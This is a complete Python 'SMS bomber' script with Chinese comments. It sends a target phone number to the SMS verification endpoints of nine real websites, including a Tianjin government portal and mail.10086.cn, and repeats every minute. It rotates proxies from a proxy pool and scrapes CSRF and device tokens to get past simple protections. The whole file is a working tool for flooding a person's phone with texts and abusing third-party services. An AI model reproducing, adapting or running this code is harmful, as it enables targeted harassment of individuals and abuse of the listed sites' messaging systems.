import asyncio
import re
import sys
import time
from datetime import datetime, timedelta

import aiohttp
from aiohttp.client_exceptions import ClientError, ClientHttpProxyError
from multidict import CIMultiDict
from yarl import URL


class CookieJar(aiohttp.CookieJar):
    def clear_host_cookies(self, host: str):
        host = URL(host)
        hostname = host.raw_host or ''
        session_cookies = self.filter_cookies(host)
        if not session_cookies:
            return
        now = self._loop.time()
        for cookie in session_cookies:
            self._expire_cookie(now, hostname, cookie)
        self._do_expiration()


class Bomber:
    DEFAULT_CONCURENT = 50
    DEFAULT_TIMEOUT = aiohttp.ClientTimeout(total=5, connect=3)

    def __init__(self, target, proxy_pool_url=None, concurrent=DEFAULT_CONCURENT):
        self.target = target
        self.concurrent = concurrent
        self.used_proxies = set()
        self.proxy_pool = proxy_pool_url

    def collect_shotters(self, session):
        r = []
        semaphore = asyncio.Semaphore(self.concurrent)
        for C in BaseShotter.__subclasses__():
            r.append(C(session, semaphore))
        return r

    async def get_proxy(self, session):
        while True:
            async with session.get(self.proxy_pool) as resp:
                content = await resp.text()
            if 'no proxy' in content:
                return None
            if content not in self.used_proxies:
                self.used_proxies.add(content)
                break
        return 'http://' + content

    async def bomb(self):
        target = self.target
        async with aiohttp.ClientSession(timeout=self.DEFAULT_TIMEOUT,
                                         cookie_jar=CookieJar()) as session:
            shotters = self.collect_shotters(session)
            while True:
                proxy = None
                if self.proxy_pool:
                    proxy = await self.get_proxy(session)
                    print('using proxy:', proxy)

                # 一种更符合逻辑的实现，不用等待任务完成
                # for shotter in shotters:
                #     asyncio.create_task(shotter.shot(target, proxy))
                # 使用 gather 的写法，需要 await gather 的返回值，不过也可以 create_task(gather(xx)) 这样就不用等待了
                works = [shotter.shot(target, proxy) for shotter in shotters]
                try:
                    # 第一个出错的 coro 会立即结束 gather
                    await asyncio.gather(*works)
                except ClientHttpProxyError:
                    print('bad proxy:', proxy)

                await asyncio.sleep(60)


_empty = object()


def deep_get(dct, dotted_path, default=_empty):
    for key in dotted_path.split('.'):
        try:
            dct = dct[key]
        except KeyError:
            return default
    return dct


class NoData(Exception):
    pass


class BaseShotter:
    URL = None
    METHOD = 'POST'
    HEADERS = None
    FIRST_GET = None
    USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36')
    REFERER = None
    XMLHTTPREQUEST = True
    COOKIE = None

    RESPONSE_TEXT_MATCH = None
    RESPONSE_JSON_MATCH = None
    RESPONSE_STATUS_MATCH = None

    DEFAULT_WAIT = timedelta(seconds=10)

    DEBUG = True

    def __init__(self, session: aiohttp.ClientSession,
                 semaphore: asyncio.Semaphore):
        self.session = session
        self.semaphore = semaphore
        self._retry_after = None

    async def shot(self, target, proxy):
        if not self.is_available():
            print(self.__class__.__name__, 'unavailable')
            return

        async with self.semaphore:
            resp = await self.do_shot(target, proxy)
            if not resp:
                return
            
        async with resp:
            await self.handle_response(resp)

    async def do_shot(self, target, proxy):
        first_get_response = None
        if self.FIRST_GET:
            first_get_response = await self.first_get(target)
            if not first_get_response:
                print(self.__class__.__name__, 'first get failed')
                return None
        try:
            params = await self.make_params(target, first_get_response)
            data = await self.make_data(target, first_get_response)
            json = await self.make_json(target, first_get_response)
            headers = await self.make_headers(target, first_get_response)
            if first_get_response:
                first_get_response.close()
        except NoData:
            print(self.__class__.__name__, 'make data failed')
            return None
        try:
            return await self.session.request(self.METHOD,
                                              self.URL,
                                              params=params,
                                              data=data,
                                              json=json,
                                              headers=headers,
                                              proxy=proxy)
        except ClientError as e:
            print('request error:', e)
            return None

    async def make_params(self, target, first_get_response):
        return None

    async def make_data(self, target, first_get_response):
        return None

    async def make_json(self, target, first_get_response):
        return None

    async def make_headers(self, target, first_get_response):
        headers = CIMultiDict(self.HEADERS or {})
        if self.USER_AGENT:
            headers['User-Agent'] = self.USER_AGENT
        if self.REFERER or self.FIRST_GET:
            headers['Referer'] = self.REFERER or self.FIRST_GET
        if self.XMLHTTPREQUEST:
            headers['X-Requested-With'] = 'XMLHttpRequest'
        if self.COOKIE:
            headers['Cookie'] = self.COOKIE
        return headers

    async def make_first_get_headers(self):
        headers = CIMultiDict(self.HEADERS or {})
        if self.USER_AGENT:
            headers['User-Agent'] = self.USER_AGENT
        if self.REFERER or self.FIRST_GET:
            headers['Referer'] = self.REFERER or self.FIRST_GET
        return headers

    async def first_get(self, target):
        # 首先 GET 一次页面，设置相应的 cookie，为后面的 POST 做准备
        try:
            self._clean_cookies()
            headers = await self.make_first_get_headers()
            return await self.session.get(self.FIRST_GET, headers=headers)
        except Exception:
            return False

    async def succeed(self, response):
        success = 0
        if self.RESPONSE_TEXT_MATCH:
            success += 1
            match = self.RESPONSE_TEXT_MATCH
            try:
                value = await response.text(errors='ignore')
            except Exception:
                return False
            if re.search(match, value):
                success -= 1

        if self.RESPONSE_JSON_MATCH:
            success += 1
            key, match = self.RESPONSE_JSON_MATCH
            try:
                data = await response.json(content_type=None)
            except Exception:
                return False
            value = deep_get(data, key)
            if value is _empty:
                return False
            if isinstance(value, str) and re.search(match, value):
                success -= 1
            else:
                if value == match:
                    success -= 1

        if self.RESPONSE_STATUS_MATCH:
            success += 1
            status = self.RESPONSE_STATUS_MATCH
            if response.status == status:
                success -= 1

        # 所有条件都满足才返回 True
        if success == 0:
            return True
        return False

    async def handle_response(self, response):
        if not response:
            self._retry_after = datetime.now() + self.DEFAULT_WAIT
            return

        succeed = await self.succeed(response)
        print(self.__class__.__name__, 'succeed:', succeed)
        if self.DEBUG:
            print('response:', repr(await response.read()))
            print('request headers:', response._request_info.headers)
            print('status code:', response.status)
        if not succeed:
            self._retry_after = datetime.now() + self.DEFAULT_WAIT

    def is_available(self):
        if self._retry_after is None:
            return True
        return self._retry_after < datetime.now()

    def _clean_cookies(self):
        self.session.cookie_jar.clear_host_cookies(self.URL)


class Shotter1(BaseShotter):
    URL = 'http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login'
    METHOD = 'POST'
    FIRST_GET = 'http://qydj.scjg.tj.gov.cn/reportOnlineService/'
    REFERER = FIRST_GET

    RESPONSE_JSON_MATCH = ('result', 'success')

    async def make_data(self, target, first_get_response):
        data = {'MOBILENO': target, 'TEMP': '1'}
        return data


class Shotter2(BaseShotter):
    URL = 'http://www.yifatong.com/Customers/gettsms'
    METHOD = 'GET'
    FIRST_GET = REFERER = 'http://www.yifatong.com/Customers/registration'
    RESPONSE_TEXT_MATCH = 'success'

    async def make_params(self, target, first_get_response):
        return {'mobile': target, 'rnd': str(round(time.time(), 3))}


class Shotter3(BaseShotter):
    URL = 'https://ems.xg-yc.com/ent/sendMobileCode'
    METHOD = 'POST'
    FIRST_GET = 'https://ems.xg-yc.com/'
    REFERER = FIRST_GET

    async def make_json(self, target, first_get_response):
        return {"mobile": target}

    async def succeed(self, response):
        try:
            result = await response.json()
        except Exception:
            return False
        if result.get('status') == 1 and result.get('message') == '':
            return True
        return False


class Shotter4(BaseShotter):
    URL = 'https://www.itjuzi.com/api/verificationCodes'
    METHOD = 'POST'
    REFERER = FIRST_GET = 'https://www.itjuzi.com/register'
    RESPONSE_JSON_MATCH = ('status', 'success')

    async def make_json(self, target, first_get_response):
        return {'account': target}


class Shotter5(BaseShotter):
    URL = 'http://www.ntjxj.com/InternetWeb/SendYzmServlet'
    METHOD = 'POST'
    REFERER = FIRST_GET = 'http://www.ntjxj.com/InternetWeb/regHphmToTel.jsp'
    RESPONSE_TEXT_MATCH = '验证码发送成功'

    async def make_data(self, target, first_get_response):
        return {'sjhm': target}


class Shotter6(BaseShotter):
    URL = 'https://passport.haodf.com/user/ajaxsendmobilecode'
    METHOD = 'POST'
    FIRST_GET = REFERER = 'https://passport.haodf.com/user/showregisterbymobile'
    HEADERS = {'Origin': 'https://passport.haodf.com',
               'Cookie': 'CNZZDATA-FE=CNZZDATA-FE'}
    RESPONSE_STATUS_MATCH = 200

    async def make_data(self, target, first_get_response):
        return {'mobileNumber': target, 'token': '', 'verify': ''}


class Shotter7(BaseShotter):
    URL = 'https://www.91wenwen.net/user/sendSms'
    METHOD = 'POST'
    FIRST_GET = 'https://www.91wenwen.net/user/mobile/reg'
    RESPONSE_TEXT_MATCH = '\[\]'

    async def make_data(self, target, first_get_response):
        first_text = await first_get_response.text()
        match = re.search(r'"device_id": ?"(.*?)".*?"csrf_token": ?"(.*?)"',
                          first_text, re.DOTALL | re.IGNORECASE)
        if match:
            device_id = match.group(1)
            csrf_token = match.group(2)
            return {
                'device_id': device_id,
                'country_code': '86',
                'mobile_phone': target,
                'csrf_token': csrf_token
            }
        raise NoData


class Shotter8(BaseShotter):
    URL = 'https://mail.10086.cn/s'
    METHOD = 'POST'
    FIRST_GET = 'https://mail.10086.cn/'
    RESPONSE_JSON_MATCH = ('code', 'S_OK')

    async def make_params(self, target, first_get_response):
        return {'func': 'login:sendSmsCode'}

    async def make_data(self, target, first_get_response):
        return ('<object><string name="loginName">{loginName}</string>'
                '<string name="fv">4</string><string name="clientId">1003</string>'
                '<string name="version">1.0</string><string name="verifyCode"></string></object>'
                ).format(loginName=target)


class Shotter9(BaseShotter):
    URL = 'http://www.11183.com.cn/ec-web/register/registAjax_vaildate.action'
    METHOD = 'POST'
    FIRST_GET = 'http://www.11183.com.cn/ec-web/register/register_toIndex.action'
    RESPONSE_JSON_MATCH = ('success', True)

    async def make_data(self, target, first_get_response):
        first_text = await first_get_response.text()
        match = re.search(r'"token": ?"(.*?)"', first_text, re.IGNORECASE)
        if match:
            token = match.group(1)
            return {
                'mobileNum': target,
                'token': token
            }
        raise NoData


def test():
    class TestShotter(BaseShotter):
        URL = 'http://httpbin.org/ip'
        METHOD = 'GET'

    class TestBomber(Bomber):
        def collect_shotters(self, session):
            semaphore = asyncio.Semaphore(self.concurrent)
            s = TestShotter
            s.DEBUG = True
            return [s(session, semaphore)]

    bomber = TestBomber(sys.argv[1])
    asyncio.run(bomber.bomb(), debug=True)
    sys.exit()


if __name__ == '__main__':
    # test()
    bomber = Bomber(sys.argv[1], 'http://127.0.0.1:5010/get/')
    asyncio.run(bomber.bomb())
